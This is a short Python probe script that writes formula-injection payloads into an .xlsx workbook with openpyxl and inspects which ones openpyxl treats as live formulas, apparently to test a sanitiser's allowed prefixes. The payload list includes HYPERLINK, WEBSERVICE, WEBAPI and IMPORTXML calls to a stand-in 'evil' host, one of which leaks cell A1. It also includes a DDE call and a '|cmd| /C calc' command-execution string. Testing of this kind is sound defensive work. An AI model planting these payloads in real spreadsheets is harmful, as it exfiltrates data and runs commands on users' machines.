"""Probe: what cell type does openpyxl assign to each prefix?

Decides whether the allowed non-'=' prefixes are live formula injections in
.xlsx (they would be if openpyxl marks them as data_type 'f').
"""
from openpyxl import Workbook, load_workbook

payloads = [
    "=HYPERLINK(\"http://evil/?x=\"&A1,\"open\")",
    "=WEBSERVICE(\"http://evil/x\")",
    "=WEBAPI(\"http://evil/x\")",
    "=IMPORTXML(\"http://evil/x\",\"//x\")",
    "=DDE(\"srv\",\"t\",\"c\")",
    "+SUM(1,1)",
    "-SUM(1,1)",
    "@SUM(1,1)",
    "\t=SUM(1,1)",
    "  =SUM(1,1)",
    " =SUM(1,1)",
    " =SUM(1,1)",
    "|cmd| /C calc",
]
ws_src = Workbook()
ws = ws_src.active
for i, p in enumerate(payloads, start=1):
    ws.cell(row=i, column=1, value=p)
buf = "/tmp/_probe_book.xlsx"
ws_src.save(buf)

wb = load_workbook(buf)
w = wb.active
print("row | data_type | value")
for i, p in enumerate(payloads, start=1):
    c = w.cell(row=i, column=1)
    print(f"  {i:2d} | {c.data_type!r:8} | {c.value!r}")

import re, zipfile
with zipfile.ZipFile(buf) as z:
    xml = z.read("xl/worksheets/sheet1.xml").decode("utf-8")
print("\n--- formula elements in sheet1.xml ---")
for m in re.finditer(r"<c r=\"A(\d+)\"[^>]*>(.*?)</c>", xml, re.S):
    print(f"  A{m.group(1)}: {m.group(2)[:120]}")
print("\n--- t=\"s\" (shared string) count:", xml.count('t="s"'))
print("--- <f> elements:", xml.count("<f>"))
